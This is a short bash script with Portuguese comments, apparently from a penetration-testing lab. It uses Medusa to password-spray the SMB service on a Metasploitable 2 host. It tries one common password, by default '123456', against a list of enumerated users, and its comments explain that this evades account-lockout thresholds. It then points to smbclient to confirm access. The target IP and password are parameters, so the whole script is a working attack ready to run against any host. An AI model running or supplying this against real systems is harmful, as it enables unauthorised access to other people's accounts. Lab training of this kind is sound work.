#!/usr/bin/env bash
# ==============================================================================
# Script: medusa_smb_spraying.sh
# Finalidade: Demonstração de Password Spraying contra o serviço SMB / Samba
# Ferramenta: Medusa v2.2+ no Kali Linux
# Alvo: Metasploitable 2 (Ambiente Host-Only Controlado)
# ==============================================================================

TARGET_IP="${1:-192.168.56.101}"
USER_LIST="../wordlists/smb_users.txt"
SPRAY_PASS="${2:-123456}"
OUTPUT_FILE="medusa_smb_spray_result.txt"

echo "=================================================="
echo "[+] Simulação de Password Spraying em SMB (Porta 445/139)"
echo "[+] Alvo: $TARGET_IP"
echo "[+] Lista de Usuários Enumerados: $USER_LIST"
echo "[+] Senha Pulverizada (Sprayed Password): $SPRAY_PASS"
echo "=================================================="

# No Password Spraying, testamos UMA senha comum contra VÁRIOS usuários.
# Isso evita o bloqueio de contas por limite de tentativas sucessivas (Account Lockout Threshold).

medusa -h "$TARGET_IP" \
       -U "$USER_LIST" \
       -p "$SPRAY_PASS" \
       -M smbnt \
       -t 2 \
       -v 4 \
       -O "$OUTPUT_FILE"

echo -e "\n[✓] Spraying concluído. Relatório gerado em: $OUTPUT_FILE"
echo "[*] Para validar um acesso encontrado, utilize:"
echo "    smbclient -L //$TARGET_IP -U <usuario_encontrado>"
